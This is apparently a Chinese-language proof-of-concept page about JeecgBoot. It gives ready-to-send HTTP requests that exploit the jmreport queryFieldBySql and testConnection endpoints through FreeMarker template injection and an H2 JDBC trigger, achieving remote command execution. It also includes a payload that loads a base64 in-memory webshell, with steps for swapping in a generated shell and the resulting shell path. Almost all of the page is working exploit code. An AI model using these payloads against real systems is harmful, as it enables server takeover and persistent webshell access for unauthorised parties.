## JeecgBoot sql注入漏洞
```
POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
Host: 192.168.90.1:3100
Origin: http://192.168.90.1:3100
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/json
Content-Length: 123

{"sql":"select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"open -a calculator.app  \") }' "}
```
## queryFieldBySql 注入内存马
```
{"sql":"call${\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.script.ScriptEngineManager\").getEngineByName(\"js\").eval(\"classLoader=java.lang.Thread.currentThread().getContextClassLoader();try{classLoader.loadClass('org.apachen.SOAPUtils').newInstance();}catch(e){clsString=classLoader.loadClass('java.lang.String');bytecodeBase64='这里填入base64的内存马';try{clsBase64=classLoader.loadClass('java.util.Base64');clsDecoder=classLoader.loadClass('java.util.Base64$Decoder');decoder=clsBase64.getMethod('getDecoder').invoke(base64Clz);bytecode=clsDecoder.getMethod('decode',clsString).invoke(decoder,bytecodeBase64);}catch(ee){try{datatypeConverterClz=classLoader.loadClass('javax.xml.bind.DatatypeConverter');bytecode=datatypeConverterClz.getMethod('parseBase64Binary',clsString).invoke(datatypeConverterClz,bytecodeBase64);}catch(eee){clazz1=classLoader.loadClass('sun.misc.BASE64Decoder');bytecode=clazz1.newInstance().decodeBuffer(bytecodeBase64);}}clsClassLoader=classLoader.loadClass('java.lang.ClassLoader');clsByteArray=(''.getBytes().getClass());clsInt=java.lang.Integer.TYPE;defineClass=clsClassLoader.getDeclaredMethod('defineClass',[clsByteArray,clsInt,clsInt]);defineClass.setAccessible(true);clazz=defineClass.invoke(classLoader,bytecode,0,bytecode.length);clazz.newInstance();};#{1};\")}","dbSource":"","type":"0"}
```
使用内存马工具生成payload，将生成的base64格式的内存马 替换payload 中bytecodeBase64的值

![image](https://github.com/wy876/POC/assets/139549762/55a9877c-c111-4897-a665-8f58e9de5300)

![image](https://github.com/wy876/POC/assets/139549762/03a476fa-7d2a-4221-9c96-c5b60040adfd)

![image](https://github.com/wy876/POC/assets/139549762/24b6b0b2-419c-43d1-a0c8-8ced440e0a79)

内存马路径：`http://192.168.18.131:8080/jeecg-boot/jmreport/queryFieldBySql/`

## JeecgBoot SSTI 漏洞
```
POST /jeecgboot/jmreport/testConnection HTTP/1.1
Host: 192.168.90.1:3100
Content-Length: 383
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: http://192.168.90.1:3100
Referer: http://192.168.90.1:3100/login?redirect=/dashboard/analysis
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{
  "id": "1",
  "code": "dataSource1",
  "dbType": "H2",
  "dbDriver": "org.h2.Driver",
  "dbUrl": "jdbc:h2:mem:test;init=CREATE TRIGGER shell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\u000A\u0009java.lang.Runtime.getRuntime().exec('open -a calculator.app')\u000A$$",
  "dbName": "test",
  "dbUsername": "sa",
  "dbPassword": "",
  "connectTimes": 5
}

```
## 漏洞分析
https://c0olw.github.io/2023/08/15/JeecgBoot-SSTI%E4%BB%A5%E5%8F%8AJDBC-RCE/
